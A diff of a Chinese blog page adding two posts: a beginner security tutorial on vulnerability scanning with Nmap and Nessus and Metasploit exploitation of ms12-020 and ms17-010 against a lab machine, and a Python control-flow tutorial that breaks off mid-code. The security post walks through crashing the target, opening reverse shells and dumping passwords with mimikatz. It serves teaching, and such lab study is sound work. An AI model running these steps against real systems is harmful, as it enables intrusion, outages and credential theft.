@@ -152,6 +152,582 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-安全初级/系统漏洞分析与验证" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/">系统漏洞分析与验证</a>
+    </h1>
+  
+
+        
+        <a href="/2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/" class="archive-article-date">
+  	<time datetime="2020-12-06T01:51:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="安全漏洞的基本概念"><a href="#安全漏洞的基本概念" class="headerlink" title="安全漏洞的基本概念"></a>安全漏洞的基本概念</h2><h3 id="漏洞的定义"><a href="#漏洞的定义" class="headerlink" title="漏洞的定义"></a>漏洞的定义</h3><p>（1）漏洞(Vulnerability)是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。简单说就是指一个系统存在的弱点或缺陷。</p>
+<p>（2）1970-80年代，早期黑客的出现和第一个计算机病毒的产生，软件漏洞逐渐引起人们的注意。</p>
+<p>（3）计算机病毒(Computer Virus)是编制者在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码。</p>
+<h3 id="漏洞的成因"><a href="#漏洞的成因" class="headerlink" title="漏洞的成因"></a>漏洞的成因</h3><p>（1）实现漏洞：是安全漏洞中最大的一类。实现漏洞是由于在程序编码时不够严谨或对于安全性的考虑不周而产生的漏洞，缓冲区溢出类漏洞就是最典型的实现漏洞。</p>
+<p>（2）设计漏洞：主要是指软件、硬件和固件在设计时对于安全性考虑不周而导致的漏洞。</p>
+<p>例如F5 BIG-ip远程绕过验证漏洞是由于F5设备的SSH登录模块内置了一个可用于登录的密钥文件，这个密钥被泄露后任意获取该密钥的用户都可以登录一台相关版本的设备。</p>
+<p>（3）配置漏洞：是由于软件的默认配置或者不恰当的配置导致的安全漏洞。</p>
+<p>例如弱口令或默认口令就是一种常见的配置漏洞。</p>
+<h3 id="漏洞实例"><a href="#漏洞实例" class="headerlink" title="漏洞实例"></a>漏洞实例</h3><p>（1)微软的RPC漏洞与蠕虫病毒</p>
+<table>
+<thead>
+<tr>
+<th align="center">时间</th>
+<th align="center">漏洞</th>
+<th align="center">危害</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2003年</td>
+<td align="center">RPC(远程过程调用协议)接口中的缓冲区溢出   冲击波蠕虫病毒</td>
+<td align="center">席卷全球80%的计算机</td>
+</tr>
+<tr>
+<td align="center">2008年</td>
+<td align="center">MS08-067漏洞，基于445端口(共享打印机/文件)   Conficker(飞客蠕虫病毒)</td>
+<td align="center">感染1500万台以上计算机</td>
+</tr>
+<tr>
+<td align="center">2017年</td>
+<td align="center">永恒之蓝(MS17-010)漏洞，基于445端口  Wannacry(勒索病毒)</td>
+<td align="center">造成80亿美元以上经济损失</td>
+</tr>
+</tbody></table>
+<p>（2）漏洞的危害：远程控制、信息泄露、拒绝服务、权限提升</p>
+<h3 id="漏洞的信息组成"><a href="#漏洞的信息组成" class="headerlink" title="漏洞的信息组成"></a>漏洞的信息组成</h3><p>（1）漏洞名称</p>
+<p>（2）发布日期</p>
+<p>（3）漏洞编号</p>
+<p>（4）风险等级</p>
+<p>（5）影响范围</p>
+<p>（6）漏洞描述</p>
+<p>（7）解决方案</p>
+<h3 id="漏洞信息管理"><a href="#漏洞信息管理" class="headerlink" title="漏洞信息管理"></a>漏洞信息管理</h3><p>（1）CVE(Common Vulnerabliities &amp; Exposures,通用漏洞披露)</p>
+<p>（2）美国国家漏洞数据库(NVD)</p>
+<p>（3）<a target="_blank" rel="noopener" href="http://cve.mitre.org/">http://cve.mitre.org</a> CVE官网</p>
+<p>（4）<a target="_blank" rel="noopener" href="http://www.cnnvd.org.cn/index.htm">http://www.cnnvd.org.cn/index.html</a> 国家信息安全漏洞库</p>
+<p>（5）<a target="_blank" rel="noopener" href="http://www.nsfocus.net/">http://www.nsfocus.net/</a> 绿盟科技</p>
+<p>（6）<a target="_blank" rel="noopener" href="http://www.scap.org.cn/">http://www.scap.org.cn/</a> SCAP 安全内容自动化协议中文社区</p>
+<p>（7）微软安全公告</p>
+<h2 id="安全漏洞的检测技术"><a href="#安全漏洞的检测技术" class="headerlink" title="安全漏洞的检测技术"></a>安全漏洞的检测技术</h2><h3 id="漏洞检测技术"><a href="#漏洞检测技术" class="headerlink" title="漏洞检测技术"></a>漏洞检测技术</h3><p>寻找漏洞方法：</p>
+<p>（1）静态分析：人为查看代码(分析代码)</p>
+<p>（2）动态分析：使用工具nmap(端口)、nessus(服务、OS)、msf(扫描、验证)进行漏洞扫描</p>
+<p>利用漏洞实时攻击：<br>（1）静态：人为写payload</p>
+<p>（2）动态：工具msf</p>
+<h3 id="常见的系统漏洞扫描器"><a href="#常见的系统漏洞扫描器" class="headerlink" title="常见的系统漏洞扫描器"></a>常见的系统漏洞扫描器</h3><p>（1）系统漏洞扫描器是相对于WEB应用漏洞扫描器而言的，主要是针对操作系统和各类通用性较强的软件应用进行漏洞检测的工具。</p>
+<p>（2）软件类：NESSUS、OpenVAS、Nmap</p>
+<p>（3）硬件类：绿盟科技远程安全评估系统、网御漏洞扫描系统、榕基风险管理系统、杭州迪普漏洞扫描系统、启明天镜脆弱性扫描与管理系统</p>
+<h3 id="系统漏洞扫描的基本流程"><a href="#系统漏洞扫描的基本流程" class="headerlink" title="系统漏洞扫描的基本流程"></a>系统漏洞扫描的基本流程</h3><p>存活判断–&gt;端口扫描–&gt;服务识别–&gt;系统识别–&gt;弱口令/登录扫描–&gt;漏洞映射</p>
+<h3 id="漏洞识别原理"><a href="#漏洞识别原理" class="headerlink" title="漏洞识别原理"></a>漏洞识别原理</h3><p>漏洞识别的主要方法可以分为原理扫描和推断扫描两类，在实际实现的过程中，扫描器开发者会根据漏洞的特点不同而选择不同的漏洞识别技术，进行漏洞识别。</p>
+<table>
+<thead>
+<tr>
+<th align="center">识别技术</th>
+<th align="center">检测思路</th>
+<th align="center">准确率</th>
+<th align="center">检测效率</th>
+<th align="center">对目标的影响</th>
+<th align="center">适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">原理扫描</td>
+<td align="center">利用漏洞形成的原因和漏洞的特点尝试对漏洞进行利用，并根据漏洞利用的结果来判断漏洞是否存在</td>
+<td align="center">高</td>
+<td align="center">步骤多，检测速度慢</td>
+<td align="center">对目标影响较大，可能导致目标宕机或破坏程序和数据</td>
+<td align="center">常用于WEB应用漏洞扫描和一些利用后不影响系统运行的漏洞，尤其不适用于拒绝服务漏洞。</td>
+</tr>
+<tr>
+<td align="center">推断扫描</td>
+<td align="center">推断扫描不直接利用漏洞，而是寻找其他漏洞存在的证据，并以此推断漏洞存在。版本检查是推断扫描的常用方式之一</td>
+<td align="center">受实现技术和漏洞修复技术的影响，有一定的误报率</td>
+<td align="center">过程简单，速度较快</td>
+<td align="center">不利用漏洞，对目标影响较小</td>
+<td align="center">适用于通用软件的扫描，在大规模的扫描任务中有比较明显的优势。</td>
+</tr>
+</tbody></table>
+<h3 id="利用Nmap扫描漏洞"><a href="#利用Nmap扫描漏洞" class="headerlink" title="利用Nmap扫描漏洞"></a>利用Nmap扫描漏洞</h3><p>（1）常见的Nmap脚本扫描，命令格式如下：</p>
+<pre><code>nmap --script=&lt;类别参数&gt;
+##常用的脚本扫描参数：
+vuln:负责检查目标机是否有常见的漏洞(Vulnerability),如是否有MS08_067</code></pre>
+<p>（2）例子：</p>
+<pre><code>ifconfig           //先查看本机所在网段
+nmap --sP 192.168.14.0/24     //扫描本网段中存活的主机
+nmap --script=vuln 192.168.14.131    //扫描靶机是否有常见的漏洞</code></pre>
+<p><img src="https://i.loli.net/2020/12/06/mDLr54RPzpfkiI6.png" alt="image-20201206140811838"></p>
+<p><img src="https://i.loli.net/2020/12/06/osvrzTiFplNQ82E.png"></p>
+<h2 id="Nessus介绍与漏洞扫描"><a href="#Nessus介绍与漏洞扫描" class="headerlink" title="Nessus介绍与漏洞扫描"></a>Nessus介绍与漏洞扫描</h2><h3 id="NESSUS简介"><a href="#NESSUS简介" class="headerlink" title="NESSUS简介"></a>NESSUS简介</h3><p>目前最多人使用的<strong>系统漏洞扫描与分析软件</strong>,具有能够提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。可同时在本机或远端上遥控，进行系统的漏洞分析扫描，运作效能随着系统的资源而自行调整。可自行定义插件(Plug-in)等特性。</p>
+<h3 id="NESSUS的功能介绍"><a href="#NESSUS的功能介绍" class="headerlink" title="NESSUS的功能介绍"></a>NESSUS的功能介绍</h3><p>（1）打开浏览器输入<a href="https://localhost:8834进入登录页面输入账号密码登录(这里使用的是虚拟机进行操作，若要在物理机上登录NESSUS，可在浏览器中输入https://192.168.14.132:8834，其中192.168.14.132是虚拟机的IP地址)">https://localhost:8834进入登录页面输入账号密码登录(这里使用的是虚拟机进行操作，若要在物理机上登录NESSUS，可在浏览器中输入https://192.168.14.132:8834，其中192.168.14.132是虚拟机的IP地址)</a></p>
+<p>（2）在首页选择new scans 或者 Creat a new scan新建一个扫描任务，新建任务时需要对扫描进行选择或者配置，带有upgrade标签的是需要升级成企业版或者专业版才能使用，这里选择免费的“Basic Network Scan进行配置。</p>
+<p><img src="https://i.loli.net/2020/12/06/AdDqFb3GT81k6f7.png" alt="image-20201206142030678"></p>
+<p><img src="https://i.loli.net/2020/12/06/m71ce3RjDa9odwA.png" alt="image-20201206142222469"></p>
+<p>（3）通常情况下，只对General(一般选项)、Discovery(主机发现)、Assessment(风险评估)、及Advanced(高级选项)进行配置。</p>
+<p><img src="https://i.loli.net/2020/12/06/fCsbW2ah5jeyw4B.png" alt="image-20201206142758916"></p>
+<h3 id="常见漏洞扫描器的使用方法"><a href="#常见漏洞扫描器的使用方法" class="headerlink" title="常见漏洞扫描器的使用方法"></a>常见漏洞扫描器的使用方法</h3><p>选择任务类型–&gt;填写扫描目标–&gt;选择扫描模板/插件–&gt;高级选项(可默认)–&gt;扫描报告选项–&gt;开始扫描</p>
+<h3 id="NESSUS的使用"><a href="#NESSUS的使用" class="headerlink" title="NESSUS的使用"></a>NESSUS的使用</h3><p>（1）设置项目名称、归属栏目为my scans，输入目标主机IP或网段</p>
+<p><img src="https://i.loli.net/2020/12/06/PJ5tnvolMpHh8Aa.png" alt="image-20201206153948858"></p>
+<p>（2）点击Launch开始扫描，可在首页查看扫描记录，点击对应的扫描任务可查看任务的详细信息，可导出</p>
+<p><img src="https://i.loli.net/2020/12/06/hygtJVelpXWNBFm.png" alt="image-20201206144435278"></p>
+<p><img src="https://i.loli.net/2020/12/06/MFipyxdWQketaKr.png" alt="image-20201206145449869"></p>
+<p>（3）选择扫描任务进入后可查看扫描信息</p>
+<p><img src="https://i.loli.net/2020/12/06/cKR5VoZiCFrJhAz.png" alt="image-20201206145610763"></p>
+<p>（4）点击要查看的漏洞，可获取该漏洞的介绍、漏洞对应的解决方案、生成原因、涉及到的端口和主机信息，可导出。</p>
+<p><img src="https://i.loli.net/2020/12/06/sd3Nc12RA8PX6TG.png" alt="image-20201206150013091"></p>
+<h3 id="NESSUS的报告解读"><a href="#NESSUS的报告解读" class="headerlink" title="NESSUS的报告解读"></a>NESSUS的报告解读</h3><p>漏洞风险等级、漏洞描述、漏洞涉及服务端口</p>
+<h2 id="Metasploit-msf-介绍与漏洞利用"><a href="#Metasploit-msf-介绍与漏洞利用" class="headerlink" title="Metasploit(msf)介绍与漏洞利用"></a>Metasploit(msf)介绍与漏洞利用</h2><p>Metasploit就是一个漏洞利用框，简称MSF。作为全球最受欢迎的工具，不仅仅因为它的方便和强大，更重要的是它的框架。它允许使用者开发自己的漏洞脚本，从而进行测试。</p>
+<h3 id="Metasploit常用的命令"><a href="#Metasploit常用的命令" class="headerlink" title="Metasploit常用的命令"></a>Metasploit常用的命令</h3><p>（1）show exploits   显示可用的渗透攻击模块</p>
+<p>（2）search               用来搜寻一些渗透攻击模块，可以进行模糊匹配</p>
+<p>（3）use                    使用某个渗透攻击模块，可以通过use命令来使用show或search出来的渗透模块</p>
+<p>（4）show options  显示参数当选择渗透模块后，使用show options会显示该模块所需设置的参数，熟练后可不      用</p>
+<p>（5）set                    用来设置某些选项，比如使用set命令设置攻击模块的options参数；设置攻击载荷payloads</p>
+<p>（6）exploit             设置完所有参数时，使用exploit命令，开始进行攻击，也可用run</p>
+<h3 id="Metasploit攻击流程与思路"><a href="#Metasploit攻击流程与思路" class="headerlink" title="Metasploit攻击流程与思路"></a>Metasploit攻击流程与思路</h3><p>搜索攻击模块–&gt;利用攻击模块–&gt;查看与配置选项–&gt;进行攻击</p>
+<p>（1）搜寻攻击模块：search + 漏洞信息或编号</p>
+<p>（2）使用某个模块：use</p>
+<p>（3）查看配置选项：show options</p>
+<p>（4）设置选项值：set</p>
+<p>（5）开始攻击：exploit/run</p>
+<h3 id="ms12-020漏洞利用"><a href="#ms12-020漏洞利用" class="headerlink" title="ms12-020漏洞利用"></a>ms12-020漏洞利用</h3><p>（1）在kali里打开metasploit漏洞利用框架，也可直接在终端中输入命令msfconsole打开</p>
+<p><img src="https://i.loli.net/2020/12/06/Uv5pFWO3dfyA9x2.png" alt="image-20201206161452095"></p>
+<p>（2）搜索ms12-020漏洞利用模块</p>
+<pre><code>search ms12-020
+auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code></pre>
+<p><img src="https://i.loli.net/2020/12/06/Qx1cHIsEkjU4hCv.png" alt="image-20201206161732437"></p>
+<p>（3）使用模块use+模块名,可用table键补全，也可以use+模块前的编号(如0,1,2….)</p>
+<p><img src="https://i.loli.net/2020/12/06/3qy5Cd9RaYbInSm.png" alt="image-20201206161936099"></p>
+<p>（4）查看当前模块所需配置项show options，有”yes”的地方需要配置参数，其中RHOST需设置为远程靶机的IP地址</p>
+<p><img src="https://i.loli.net/2020/12/06/Hy6SwYbgshczuTV.png" alt="image-20201206162138879"></p>
+<p>（5）设置配置项，这一步配置好后，可以再次执行show options命令查看是否设置成功</p>
+<pre><code>set RHOST 192.168.14.131      //192.168.14.131为靶机的IP</code></pre>
+<p><img src="https://i.loli.net/2020/12/06/qSI5pXsAk6TDtrW.png" alt="image-20201206162349469"></p>
+<p>（6）实施攻击exploit或run，可发现靶机蓝屏</p>
+<p><img src="https://i.loli.net/2020/12/06/4kCD1JwWvxX7Bhd.png" alt="image-20201206162544164"></p>
+<p><img src="https://i.loli.net/2020/12/06/ELmSMNu4rqGJTsO.png" alt="image-20201206162959336"></p>
+<h3 id="ms17-010漏洞利用"><a href="#ms17-010漏洞利用" class="headerlink" title="ms17-010漏洞利用"></a>ms17-010漏洞利用</h3><p>（1）在kali里打开metasploit漏洞利用框架，也可直接在终端中输入命令msfconsole打开</p>
+<p>（2）搜索ms17-010漏洞利用模块</p>
+<p>（3）使用模块use+模块名，不同的攻击模块效果不同，这里使用第三个攻击模块</p>
+<p><img src="https://i.loli.net/2020/12/06/5qv39wEAKTyGPox.png" alt="image-20201206163607554"></p>
+<p>（4）show options</p>
+<p><img src="https://i.loli.net/2020/12/06/Adl2F3oyBrD86sI.png" alt="image-20201206163718981"></p>
+<p>（5）设置配置项，这一步配置好后，可以再次执行show options命令查看是否设置成功</p>
+<pre><code>set RHOST 192.168.14.131       //192.168.14.131为靶机的IP</code></pre>
+<p>（6）开始攻击exploit/run，可发现获取了靶机的shell界面，Ctrl+C退出该shell界面</p>
+<p><img src="https://i.loli.net/2020/12/06/hPi6Of7QCVS2Lnw.png" alt="image-20201206164237163"></p>
+<p>（7）但是存在乱码，解决方法：”终端”–&gt;”设定字符编码”–&gt;”简体中文—GB2312”</p>
+<p><img src="https://i.loli.net/2020/12/06/39vQqjzUVWZ2wgM.png" alt="image-20201206164518356"></p>
+<p><img src="https://i.loli.net/2020/12/06/HgTtuQGAfwh2m8b.png" alt="image-20201206164717015"></p>
+<p>（8）利用获取的shell界面，在靶机桌面创建一个1.txt文档。</p>
+<pre><code>cd /users/ndsec/Desktop
+edit 1.txt</code></pre>
+<p>（9）利用ms17-010漏洞进行实时监控靶机</p>
+<pre><code>set payload windows/x64/vncinject/reverse_tcp</code></pre>
+<p><img src="https://i.loli.net/2020/12/06/zUqP5EeRxMYHwod.png" alt="image-20201206165435030"></p>
+<p>（10）利用ms17-010漏洞获取靶机密码</p>
+<pre><code>set payload windows/x64/meterpreter/reverse_tcp
+exploit/run
+load mimikatz        //加载模块获取密码
+msv                  //利用mimikatz的msv获取密文hash
+kerberos             //获取明文密码</code></pre>
+<p><img src="https://i.loli.net/2020/12/06/kaUPCm1t3sovcnL.png" alt="image-20201206171203722"></p>
+<p><img src="https://i.loli.net/2020/12/06/o6sd89qRGHfbme3.png" alt="image-20201206172505028"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">安全初级</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/12/06/%E5%AE%89%E5%85%A8%E5%88%9D%E7%BA%A7/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E9%AA%8C%E8%AF%81/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Python/深入Python语言(三)-程序的控制结构01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/02/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8401/">深入Python语言(三)</a>
+    </h1>
+  
+
+        
+        <a href="/2020/12/02/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%89)-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%8401/" class="archive-article-date">
+  	<time datetime="2020-12-02T03:50:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="程序的基本结构"><a href="#程序的基本结构" class="headerlink" title="程序的基本结构"></a>程序的基本结构</h2><p>要点：程序由3种基本结构组成：顺序结构、分支结构和循环结构</p>
+<h3 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h3><p>（1）顺序结构：程序按照线性顺序依次执行的一种运行方式</p>
+<p>（2）分支结构：程序根据条件判断结果而选择不同向前执行路径的一种运行方式。包括单分支结构和二分支结构，二分支结构组合形成多分支结构。</p>
+<p>（3）循环结构：程序根据条件判断结果向后反复执行的一种运行方式。根据循环体触发条件不同，循环结构包括条件循环和遍历循环。</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>（1）圆面积和周长的计算</p>
+<pre><code class="python">R = eval(input(&quot;请输入圆半径：&quot;))
+S = 3.1415*R*R
+L = 2*3.1415*R
+print(&quot;面积和周长&quot;,S,L)</code></pre>
+<p>（2）实数绝对值的计算</p>
+<pre><code class="python">R = eval(input(&quot;输入实数：&quot;))
+if (R &lt; 0):
+    R = -R
+print(&quot;绝对值为&quot;,R)</code></pre>
+<p>（3）正整数累加</p>
+<pre><code class="python">R = eval(input(&quot;请输入整数：&quot;))
+i,sum = 0, 0
+while(i&lt;=R):
+    sum += i
+    i +=1
+print(&quot;累加求和&quot;,sum)</code></pre>
+<h2 id="程序的分支结构"><a href="#程序的分支结构" class="headerlink" title="程序的分支结构"></a>程序的分支结构</h2><h3 id="单分支结构-if语句"><a href="#单分支结构-if语句" class="headerlink" title="单分支结构:if语句"></a>单分支结构:if语句</h3><p>（1）Python中if语句的语法格式如下：</p>
+<pre><code class="python">if &lt;条件&gt;:
+    &lt;语句块&gt;</code></pre>
+<p>（2）形成条件判断最常见的方式是采用关系操作符。Python共有6个关系操作符。</p>
+<table>
+<thead>
+<tr>
+<th align="center">操作符</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&lt;</td>
+<td align="center">小于</td>
+</tr>
+<tr>
+<td align="center">&lt;=</td>
+<td align="center">小于或等于</td>
+</tr>
+<tr>
+<td align="center">&gt;=</td>
+<td align="center">大于或等于</td>
+</tr>
+<tr>
+<td align="center">&gt;</td>
+<td align="center">大于</td>
+</tr>
+<tr>
+<td align="center">==</td>
+<td align="center">等于</td>
+</tr>
+<tr>
+<td align="center">!=</td>
+<td align="center">不等于</td>
+</tr>
+</tbody></table>
+<p><strong>Python使用”=”表示赋值语句，使用”==”表示等于</strong></p>
+<p>（3）实例：PM2.5空气质量提醒(1)</p>
+<pre><code class="python">PM = eval(input(&quot;请输入PM2.5值：&quot;))
+if 0 &lt;= PM &lt; 35:
+    print(&quot;空气质量优，快去户外活动!&quot;)
+if 35 &lt;= PM &lt;75:
+    print(&quot;空气质量良好，适度户外活动!&quot;)
+if 75 &lt;= PM:
+    print(&quot;空气污染，请小心!&quot;)</code></pre>
+<p>（4）上述代码使用数字进行比较，而字符或字符串也可以用于条件比较。字符串比较本质上是字符串对应Unicode编码的比较。因此，字符串的比较按照字典顺序进行。例如英文大写字符对应的Unicode编码比小写字符小。</p>
+<pre><code class="python">&gt;&gt;&gt; &quot;Python&quot; &gt; &quot;python&quot;
+False</code></pre>
+<h3 id="二分支结构-if-else语句"><a href="#二分支结构-if-else语句" class="headerlink" title="二分支结构:if-else语句"></a>二分支结构:if-else语句</h3><p>（1）Python语句中if-else语句用来形成二分支结构，语法格式如下：</p>
+<pre><code class="python">if &lt;条件&gt;:
+    &lt;语句块1&gt;
+else:
+    &lt;语句块2&gt;</code></pre>
+<p>（2）语句块1是在if条件满足后执行的一个或多个语句序列，语句块2是if条件不满足后执行的语句序列。</p>
+<p>（3）实例：PM2.5空气质量提醒(2)</p>
+<pre><code class="python">PM = eval(input(&quot;请输入PM2.5数值：&quot;))
+if PM &gt;=75:
+    print(&quot;空气存在污染，请小心!&quot;)
+else:
+    print(&quot;空气没有污染，可以开展户外活动!&quot;)</code></pre>
+<p>（4）二分支结构还有一种更为简洁的表达方式，适合通过判断返回特定值，语法格式如下：</p>
+<pre><code class="python">&lt;表达式1&gt; if &lt;条件&gt; else &lt;表达式2&gt;</code></pre>
+<p>上述实例可改造为：</p>
+<pre><code class="Python">PM = eval(input(&quot;请输入PM2.5数值：&quot;))
+print(&quot;空气&#123;&#125;污染!&quot;.format(&quot;存在&quot; if PM &gt;= 75 else &quot;没有&quot;))</code></pre>
+<p>（5）其他适合对特殊值处理的情况：</p>
+<pre><code class="python">&gt;&gt;&gt; count = 2
+&gt;&gt;&gt; count if count!=0 else &quot;不存在&quot;
+2
+&gt;&gt;&gt; count = 0
+&gt;&gt;&gt; count if count!=0 else &quot;不存在&quot;
+&#39;不存在&#39;</code></pre>
+<h3 id="多分支结构：if-elif-else语句"><a href="#多分支结构：if-elif-else语句" class="headerlink" title="多分支结构：if-elif-else语句"></a>多分支结构：if-elif-else语句</h3><p>（1）Python的if-elif-else描述多分支结构，语句格式如下：</p>
+<pre><code class="python">if &lt;条件1&gt;:
+    &lt;语句块1&gt;
+elif &lt;条件2&gt;:
+    &lt;语句块2&gt;
+...
+else:
+    &lt;语句块N&gt;</code></pre>
+<p>（2）多分支结构是二分支结构的扩展，通常用于设置同一个条件的多条执行路径。Python依次评估寻找第一个结果为True的条件，执行该条件下的语句块，然后跳过整个if-elif-else结构，执行后面的语句。</p>
+<p>（3）实例：</p>
+<pre><code class="python">PM = eval(input(&quot;请输入PM2.5值：&quot;))
+if 0 &lt;= PM &lt; 35:
+    print(&quot;空气质量优，快去户外活动!&quot;)
+elif 35 &lt;= PM &lt;75:
+    print(&quot;空气质量良好，适度户外活动!&quot;)
+else:
+    print(&quot;空气污染，请小心!&quot;)</code></pre>
+<h2 id="实例5-身体质量指数BMI"><a href="#实例5-身体质量指数BMI" class="headerlink" title="实例5:身体质量指数BMI"></a>实例5:身体质量指数BMI</h2><p>（1）BMI定义:BMI值等于体重(kg)除以身高(m)的平方。</p>
+<p>（2）指标分类：</p>
+<table>
+<thead>
+<tr>
+<th align="center">分类</th>
+<th align="center">国际BMI值</th>
+<th align="center">国内BMI值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">偏瘦</td>
+<td align="center">&lt;18.5</td>
+<td align="center">&lt;18.5</td>
+</tr>
+<tr>
+<td align="center">正常</td>
+<td align="center">18.5~25</td>
+<td align="center">18.5~24</td>
+</tr>
+<tr>
+<td align="center">偏胖</td>
+<td align="center">25~30</td>
+<td align="center">24~28</td>
+</tr>
+<tr>
+<td align="center">肥胖</td>
+<td align="center">&gt;=30</td>
+<td align="center">&gt;=28</td>
+</tr>
+</tbody></table>
+<p>（3）</p>
+<pre><code class="python">height, weight = eval(input(&quot;请输入身高(米)和体重\      #采用反斜杠(\)将很长的一行分解两行书写
+(公斤)[逗号隔开]:&quot;))
+bmi = weight / pow(height,2)
+print(&quot;BMI数值为：&#123;:.2f&#125;&quot;.format(bmi))
+who, dom = &quot;&quot;,&quot;&quot;
+if bmi &lt; 18.5:      #WHO标准
+    who = &quot;偏瘦&quot;
+elif bmi &lt; 25:
+    who = &quot;正常&quot;
+elif bmi &lt;30:
+    who = &quot;偏胖&quot;
+else:
+    who = &quot;肥胖&quot;
+
+if bmi &lt; 18.5:      #我国卫生部标准
+    dom = &quot;偏瘦&quot;
+elif bmi &lt; 24:
+    dom = &quot;正常&quot;
+elif bmi &lt; 28:
+    dom = &quot;偏胖&quot;
+else:
+    dom = &quot;肥胖&quot;
+
+print(&quot;BMI指标为：国际&#39;&#123;0&#125;&#39;,国内&#39;&#123;1&#125;&#39;&quot;.format(who, dom))</code></pre>
+<h2 id="程序的循环结构"><a href="#程序的循环结构" class="headerlink" title="程序的循环结构"></a>程序的循环结构</h2><p><strong>要点：Python通过for、while等保留字提供遍历循环和无限循环的结构</strong></p>
+<p>（1）根据循环的确定次数，可分为确定次数循环和非确定次数循环。</p>
+<p>（2）确定次数循环在Python中被称为“遍历循环”，具体采用for语句实现。</p>
+<p>（3）非确定次数循环程序不确定循环体可能的执行次数，而通过条件判断是否继续执行循环体，称为无限循环，又叫条件循环，采用while语句实现。</p>
+<h3 id="遍历循环：for语句"><a href="#遍历循环：for语句" class="headerlink" title="遍历循环：for语句"></a>遍历循环：for语句</h3><p>（1）Python通过保留字for实现“遍历循环”，基本使用方法如下：</p>
+<pre><code>for &lt;循环变量&gt; in &lt;遍历结构&gt;:
+    &lt;语句块&gt;</code></pre>
+<p>（2）遍历结构可以是字符串、文件、组合数据类型或range()函数等，常用的使用方法如下：</p>
+<pre><code class="Python">#循环n次
+for i in range(n):
+    &lt;语句块&gt;
+
+#遍历文件file的每一行
+for line in file:
+    &lt;语句块&gt;
+
+#遍历字符串s
+for c in s:
+    &lt;语句块&gt;
+
+#遍历列表ls
+for item in ls:
+    &lt;语句块&gt;</code></pre>
+<p>（3）遍历循环的一种扩展模式，使用方法如下：</p>
+<pre><code class="python">for &lt;循环结构&gt; in &lt;遍历结构&gt;:
+    &lt;语句块1&gt;
+else:
+    &lt;语句块2&gt;</code></pre>
+<p>在扩展模式中，else语句只在循环正常执行并结束后才执行。因此，可以在&lt;语句块2&gt;中放置判断循环执行情况的语句。</p>
+<pre><code class="python">for s in &quot;BIT&quot;:
+    print(&quot;循环进行中：&quot;+s)
+else:
+    s = &quot;循环正常结束&quot;
+print(s)</code></pre>
+<p>执行结果：</p>
+<pre><code class="python">循环进行中：B
+循环进行中：I
+循环进行中：T
+循环正常结束
+&gt;&gt;&gt; </code></pre>
+<h3 id="无限循环：while语句"><a href="#无限循环：while语句" class="headerlink" title="无限循环：while语句"></a>无限循环：while语句</h3><p>（1）Python通过保留字while实现无限循环，基本使用方法如下：</p>
+<pre><code class="Python">while &lt;条件&gt;：
+    &lt;语句块&gt;</code></pre>
+<p>其中条件与if语句中的判断条件一样，结果为True和False。</p>
+<p>（2）无限循环：使用保留字else的扩展模式，使用方法如下：</p>
+<pre><code class="python">while &lt;条件&gt;:
+    &lt;语句块1&gt;
+else：
+    &lt;语句块2&gt;</code></pre>
+<p>在这种扩展模式中，else语句只在循环正常执行后才执行。</p>
+<pre><code class="python">s, idx = &quot;BIT&quot;, 0
+while idx &lt; len(s):
